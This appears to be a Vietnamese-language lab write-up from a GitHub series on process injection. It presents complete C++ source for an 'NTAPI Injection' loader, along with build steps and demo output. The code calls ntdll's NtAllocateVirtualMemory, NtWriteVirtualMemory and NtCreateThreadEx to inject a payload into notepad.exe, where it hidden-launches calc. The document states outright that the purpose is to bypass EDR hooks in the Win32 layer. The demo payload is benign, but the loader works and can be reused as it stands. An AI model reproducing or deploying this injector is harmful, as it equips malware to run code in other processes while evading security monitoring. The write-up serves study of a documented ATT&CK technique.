
---

# 📝 [PE 23] NTAPI Injection (Direct Native API Execution)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**NTAPI Injection (Can thiệp bộ nhớ qua cổng Native API)** đại diện cho giải thuật can thiệp không gian ảo và điều phối luồng xử lý chuyên sâu, thuộc phân hệ **Né tránh cơ chế bẫy Hook tầng Win32 Subsystem (Win32 API Layer Evasion)**.

Mọi chương trình phần mềm thông thường trên hệ điều hành Windows khi có ý đồ can thiệp bộ nhớ ảo chéo tiến trình đều phải sử dụng các hàm Win32 API phổ thông đã được tài liệu hóa (Documented APIs). Tuy nhiên, phân hệ bọc ngoài này chính là "tử huyệt" bảo mật tĩnh và động, nơi các giải pháp Endpoint Detection and Response (EDR) ưu tiên thiết lập mật độ bẫy giám sát User-mode Inline Hooks dày đặc kịch trần.

Dự án PE 23 hóa giải triệt để rào cản này bằng chiến thuật **Gạt bỏ lớp thông dịch Win32 (Subsystem Interception Bypass)**. Loader thực hiện phân giải và triệu hồi trực tiếp các System Calls bọc ngoài do thư viện lõi `ntdll.dll` xuất bản (nhóm Native APIs mang tiền tố `Nt/Zw`). Dòng chảy tham số dữ liệu và điều phối lệnh CPU được vận chuyển thẳng từ không gian ảo của Loader xuống cấu trúc quản lý thuộc nhân Kernel thông qua phân hệ cổng Native, bẻ gãy hoàn toàn khả năng bắt chặn và ghi nhật ký của các cảm biến an ninh đặt tại tầng Win32 Subsystem (`kernel32.dll` / `KernelBase.dll`).

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Win32 Hooks**: Vượt qua hàng rào giám sát cuộc gọi liên tiến trình của EDR bằng cách luồn lách dòng chảy thực thi xuống tháp hàm Native API.
* **Làm chủ quy chuẩn tham số Native Subsystem**: Nghiên cứu kiến trúc cấu hình cấu trúc dữ liệu đặc thù của các hàm nhân (`NTSTATUS` Return Taxonomy) và cơ chế quản lý con trỏ cấp thấp.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc phân lớp (Layered Architecture) của hệ điều hành Windows, phân hệ Win32 Subsystem thực chất chỉ đóng vai trò là một lớp thông dịch trung gian (Wrapper Layer). Khi mã nguồn ứng dụng phát lệnh triệu hồi một hàm như `VirtualAllocEx`, phân hệ bọc trong của Microsoft (`kernel32.dll`) sẽ thực hiện chuyển đổi cấu trúc tham số đầu vào, thiết lập bản ghi và phát lệnh gọi xuống hàm Native tương ứng là `NtAllocateVirtualMemory` sống lọt lòng `ntdll.dll` trước khi CPU thực thi lệnh ngắt hệ thống **`syscall`** để hạ cánh xuống Ring 0.

Quy trình giải phẫu bản đồ RAM và chọc thủng phân hệ bọc ngoài Win32 được điều phối ngầm qua 4 giai đoạn cấu trúc:

```
[Mở Handle] ──> [NtAllocateVirtualMemory: Phân bổ trang thực thi chéo tiến trình từ xa]
                     └──> [NtWriteVirtualMemory: Bơm mã máy PIC và bảng dữ liệu tham số]
                               └──> [NtCreateThreadEx: Khởi tạo luồng Native kích nổ Payload]

```

1. **Bóc tách con trỏ Native ngầm**: Loader phối hợp sử dụng giải thuật phân giải động trỏ thẳng vào vùng nhớ ảo của `ntdll.dll` nhằm trích xuất tọa độ Base Address sống của tháp hàm Native tối cao: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, và `NtCreateThreadEx`.
2. **Cấp phát bộ nhớ ảo tầng thấp (`NtAllocateVirtualMemory`)**: Khác biệt hoàn toàn với các tham số đơn giản của Win32 API, hàm Native API yêu cầu mã nguồn truyền địa chỉ vùng nhớ dưới dạng con trỏ cấp hai (`PVOID* BaseAddress`) cùng thông số độ rộng vùng nhớ dưới dạng tham chiếu chỉ mục (`PSIZE_T RegionSize`). Nhân Kernel tiếp nhận lệnh, trực tiếp phân bổ dải trang nhớ mang cờ đặc quyền **`PAGE_EXECUTE_READWRITE` (RWX)** lọt lòng tiến trình mục tiêu.
3. **Bơm dữ liệu trực tiếp chéo tiến trình (`NtWriteVirtualMemory`)**: Loader thực hiện lệnh ánh xạ mảng byte dữ liệu tuyệt đối toán học và khối mã máy PIC trực tiếp sang bộ nhớ RAM của đối phương thông qua cổng Native, hoàn toàn không thông qua lớp đệm thông dịch bọc ngoài, triệt tiêu chỉ dấu sinh nhật ký Win32.
4. **Khai hỏa luồng Native Object (`NtCreateThreadEx`)**: Hàm Native tối cao này thiết lập một cấu trúc Thread Object nằm lọt lòng danh bạ quản lý của tiến trình mục tiêu (`notepad.exe`) mà không cần sự thông qua của lớp quản lý luồng cấp Win32, cưỡng bách CPU đối phương bước vào chu kỳ rút lệnh thực thi Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa chuẩn xác nguyên mẫu các hàm Native API (Undocumented), dùng PVOID để giữ phẳng sạch dependencies
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua Native API
DWORD WINAPI RemoteNtApiPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, né hoàn toàn hàng rào địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }
    CloseHandle(snapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 23: NATIVE API (NTDLL) INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // 2. Nạp động thư viện cốt lõi ntdll.dll để phân giải hàm Native
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return EXIT_FAILURE;

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // 3. Mở Handle kết nối xuyên biên giới quyền hạn cao
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // 4. Áp dụng quy trình Cấp phát động thích ứng (Zero Static Buffers) vừa khít từng phân đoạn
    SIZE_T functionSize = 500;
    PVOID remoteCodeBuffer = NULL;

    // Gọi Native API cấp phát vùng nhớ thực thi từ xa cho mã máy
    NtAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Cấp phát phân vùng dữ liệu tham số tuyệt đối chéo biên giới mang quyền RW
    SIZE_T dataSize = sizeof(THREAD_DATA);
    PVOID remoteDataBuffer = NULL;
    NtAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] NtAllocateVirtualMemory that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX thiet lap tu xa tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // 5. Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Ghi mã máy hàm độc lập vị trí và cấu trúc tham số sang RAM Notepad bằng Native API
    SIZE_T bytesWritten = 0;
    NtWriteVirtualMemory(hProcess, remoteCodeBuffer, (PVOID)RemoteNtApiPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Anh xa logic ham va cau truc tham so qua song song hoan tat." << std::endl;

    // 6. Kích nổ Thread chạy từ xa xuyên qua mọi tầng hook Win32 của giải pháp bảo mật
    std::cout << "[*] Dang khoi tao luong tu xa NtCreateThreadEx de khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] NTAPI Injection executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Error code: " << GetLastError() << std::endl;
    }

    // Thu hồi tài nguyên sạch sẽ chống rò rỉ tài nguyên hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru không phụ thuộc môi trường khi mang sang môi trường máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn thư viện CRT lọt lòng file thực thi `.exe`.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng mục tiêu `Notepad.exe` trên môi trường Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành để theo dõi ma trận thực thi tầng thấp:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE23_NTAPI_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE23_NTAPI_Injection\x64\Release\NTAPI_Injection.exe
====================================================
[*] PE 23: NATIVE API (NTDLL) INJECTION
====================================================
[+] Da tim thay Notepad.exe voi PID: 8484
[+] Vung nho Code RWX thiet lap tu xa tai: 0x000001F01AC20000
[+] Anh xa logic ham va cau truc tham so qua song song hoan tat.
[*] Dang khoi tao luong tu xa NtCreateThreadEx de khai hoa...
[+] NTAPI Injection executed successfully inside Target!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_wp2RJme5j0" src="https://github.com/user-attachments/assets/1493e349-f155-492e-9d73-3096749d8719" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Architecture**: *Windows Core Internal Functions & NtAllocateVirtualMemory Spec Specifications* - Windows Native API Reference Guide.
* **Gary Nebbett**: *Windows NT/2000 Native API Reference* - In-depth structural documentation on undocumented entry points.
* **Phineas (Malware Evasion Frameworks)**: *Bypassing User-Mode Win32 Hooks via Subsystem-Level Native Calling Conventions*.
* **MITRE ATT&CK Matrix System**: *Defense Evasion: Native API Execution (T1106)* & *Process Injection (T1055)*.

---
